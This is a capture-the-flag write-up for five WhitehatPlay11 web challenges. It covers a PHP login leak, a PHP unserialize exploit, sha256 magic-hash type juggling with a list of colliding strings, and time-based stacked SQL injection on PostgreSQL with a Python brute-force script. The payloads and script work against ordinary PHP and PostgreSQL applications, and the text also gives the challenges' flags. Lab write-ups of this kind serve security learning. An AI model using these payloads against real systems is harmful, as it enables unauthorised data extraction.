# WhitehatPlay11 - Web

Hello, I hope that my write-up is useful to you.

## Web03-Arthur

### Description:

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled.png)

### Solution:

![The front end of the website](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%201.png)

The front end of the website

The first step when I do all web challenges is to click Ctrl+U (reconnaissance step) then I find the flag immediately.

![The flag is: WhiteHat{N0nG_NhU_th3_n4y_th1_l4M_s40_Ph41_M4c}](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%202.png)

The flag is: WhiteHat{N0nG_NhU_th3_n4y_th1_l4M_s40_Ph41_M4c}

## Web05-Login

### Description:

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%203.png)

### Solution:

The front end of the website shows us a login form

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%204.png)

First I recon it by clicking Ctrl+U to see the source code. However, this time, I didn’t see any clue there. I then tried to log in as any username and phone and clicked the log-in button to see what would happen. 

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%205.png)

We can see the code of a PHP file and this script is used to provide the authentication for web page. the Script executes after submitting the user login button.

![PHP login script](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%206.png)

PHP login script

So we can see the condition to log-in successfully is: 

- username=”DuctBT”
- phone=”09xxxxxx5” (I am almost tricked into brute-forcing phone)

![The flag is: WhiteHat{Pe0ple_m4ke_it_complicated}](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%207.png)

The flag is: WhiteHat{Pe0ple_m4ke_it_complicated}

## Web07-See you again

### Description

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%208.png)

### Solution:

![The front-end of the web page](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%209.png)

The front-end of the web page

First I recon it by clicking Ctrl+U to see the source code and get the clue in the comment.

![the source code of the website and the clue ](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2010.png)

the source code of the website and the clue 

I put the query string (is_debug=1) in the URL and send the GET request and see some important PHP script

![the source code appears after sending the query string](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2011.png)

the source code appears after sending the query string

After searching the information about “unserialize”, I find that “**unserialize()** takes the serialized string, which specifies the class of the object to be created and the properties of that object. With that data, unserialize() creates a copy of the originally serialized object. It will then search for a function named **__wakeup()**, and execute code in that function if it is defined for the class. **__wakeup()** is called to reconstruct any resources that the object may have.” 

It means that I need to pass a serialized string, which specifies “getFileSystem” class

```php
O:13:"getFileSystem":0:{}
```

Then we will base64-encode the above string and submit it:

![encode the “O:13:"getFileSystem":0:{}” string](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2012.png)

encode the “O:13:"getFileSystem":0:{}” string

![Submit and then get the Flag: WhiteHat{See_you_ag4in:[https://www.youtube.com/watch?v=RgKAFK5djSk](https://www.youtube.com/watch?v=RgKAFK5djSk)}](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2013.png)

Submit and then get the Flag: WhiteHat{See_you_ag4in:[https://www.youtube.com/watch?v=RgKAFK5djSk](https://www.youtube.com/watch?v=RgKAFK5djSk)}

### Refference

- [https://medium.com/swlh/diving-into-unserialize-3586c1ec97e](https://medium.com/swlh/diving-into-unserialize-3586c1ec97e)
- [https://www.arridae.com/blogs/PHP-Deserialization.php](https://www.arridae.com/blogs/PHP-Deserialization.php)

## Web08-babyhash

### Description

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2014.png)

### Solution

![The front end of the website](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2015.png)

The front end of the website

Click “View Source Code” and see the PHP script which is used to provide authentication for web page. 

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2016.png)

First, the value of the “input” needs to be equal to “DucBTTPA”. The problem here is that whenever we enter a string containing a substring “DucBTTPA”, the code will replace it with “”. The solution to this problem is that we will insert “DucBTTPA” string in 1 - “DucBTTPA”.length()-2 position. For example “DucDucBTTPABTTPA”

After passing the first problem we need to bypass the following condition to see the flag

```php
if($input2!==$input3 && hash("sha256",$input2)==hash("sha256",$input3))
```

We will use **magic hashes** to exploit **Type Juggling attacks** in PHP. In PHP two strings matching the regular expression `0+e[0-9]+`compared with `==`returns `true`

```php
'0e1' == '00e2'== '0e1337' == '0'
```

so we can take two of the following strings to pass them into “input2” and “input3” parameter

```php
34250003024812:0e46289032038065916139621039085883773413820991920706299695051332
TyNOQHUS:0e66298694359207596086558843543959518835691168370379069085300385
CGq'v]`1:0e24075800390395003020016330244669256332225005475416462877606139
\}Fr@!-a:0e72388986848908063143227157175161069826054332235509517153370253
|+ydg uahashcat:0e47232208479423947711758529407170319802038822455916807443812134
8W-vW:5ghashcat:0e99625202804787226908207582077273485674961623832383874594371630 (note: the plaintext has a colon in the middle)
mz586Ostt0:0e68778243444544519255778909858576221322537110103676691840647395
Sol7trnk00:0e57289584033733351592613162328254589214408593566331187698889096
NzQEVVCN10:0e92299296652799688472441889499080435414654298793501210067779366
Z664cnsb60:0e51257675595021973950657753067030245565435125968551772003589958
jF7qQUmx70:0e04396813052343573929892122002074460952498169617805703816566529
0e9682187459792981:0e84837923611824342735254600415455016861658967528729588256413411
0e9377421626279222:0e48575090397052833642912654053751294419348146401806328515618635
```

I used following URL request to get the flag

```php
http://192.81.209.60:8844/?input=DucDucBTTPABTTPA&input2=TyNOQHUS&input3=Sol7trnk00
```

![The flag is: WhiteHat{[https://www.youtube.com/watch?v=c6I2uF5eBL8](https://www.youtube.com/watch?v=c6I2uF5eBL8)}](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2017.png)

The flag is: WhiteHat{[https://www.youtube.com/watch?v=c6I2uF5eBL8](https://www.youtube.com/watch?v=c6I2uF5eBL8)}

### Reference:

- [https://offsec.almond.consulting/super-magic-hash.html#:~:text=TL%3BDR%3A Magic hashes are,storage and incorrect Bcrypt usage](https://offsec.almond.consulting/super-magic-hash.html#:~:text=TL%3BDR%3A%20Magic%20hashes%20are,storage%20and%20incorrect%20Bcrypt%20usage).
- [https://github.com/spaze/hashes/blob/master/sha256.md](https://github.com/spaze/hashes/blob/master/sha256.md)

## Web06-Pokedex

### Description

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2018.png)

### Solution

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2019.png)

there is no clue in source code of the web page, so I attempted to insert some payload and use sqlmap to check whether the web is vulnerable to SQL injection.

![output of sqlmap](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2020.png)

output of sqlmap

From the output of sqlmap, we can see that this is a PostgreSQL database, and the tested HTTP request can be used as a `stacked queries`(stacked injection point), and the probe is `2;SELECT PG_SLEEP(5)--`.

> **Stacked injection** means that multiple pieces of SQL can be `;`spliced .
> 

Typically, user tables are stored `public`in . We keep using sqlmap to get all table name in the current database schema 

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2021.png)

Obviously, `public`there is only one table in the schema pokemon. We then specify this table through the sqlmap `-T`parameter , and then `--columns`query its table structure through the parameter:

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2022.png)

However, there is a problem that it wastes a lot of time to get all table data because the number of pokemon is huge, so we need to generate a generic payload

First, we need to check whether special pokemon is available

```sql
asc; SELECT ((CASE WHEN (SELECT length(name) from pokemon where is_special='true' limit 1 offset 0) > 0 THEN PG_SLEEP(3) ELSE PG_SLEEP(0) END))--
```

After sending the above request, we got a delay, so it means that the special pokemon is available

Next step, we need to find which column stores the flag string (In this case, the column containing the flag is “description”)

```sql
desc; (SELECT (CASE WHEN (SELECT description from pokemon where is_special='true' limit 1 offset 0) like '%WhiteHat%' THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END))--
```

Finally I wrote a python script to brute-force the flag

```python
import requests
from itertools import permutations

burp0_url = "http://164.92.81.231:9036/search?query=pi&order_by=desc%3b(SELECT%20(CASE%20WHEN%20(SELECT%20length(name)%20from%20pokemon%20where%20is_special%3d'true'%20limit%201%20offset%200)%20%3d%2024%20THEN%20PG_SLEEP(3)%20ELSE%20PG_SLEEP(0)%20END))--"
burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://164.92.81.231:9036/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
response=requests.get(burp0_url, headers=burp0_headers)
print(response.elapsed.total_seconds())
des_sentence="%WhiteHat{"
char="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_"
d=0
while(1):
    while(d<30):
        for i in char:
            test_des_sentence= des_sentence+i
            query_payload="(SELECT (CASE WHEN (SELECT description from pokemon where is_special='true' limit 1 offset 0) like '"+test_des_sentence+"%"+"' THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END))--"
            full_query="http://164.92.81.231:9036/search?query=pi&order_by=desc; "+query_payload
            print(full_query)
            response=requests.get(full_query, headers=burp0_headers)
            if(response.elapsed.total_seconds()>=3):
                des_sentence=test_des_sentence
                break
        print(des_sentence)
        d+=1
```

![Untitled](WhitehatPlay11%20-%20Web%20b069cda417f4481997735214faf64af9/Untitled%2023.png)

Final flag is: WhiteHat{I_w4s_made_4_sunny_d4ys}
### Reference:

- [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md).
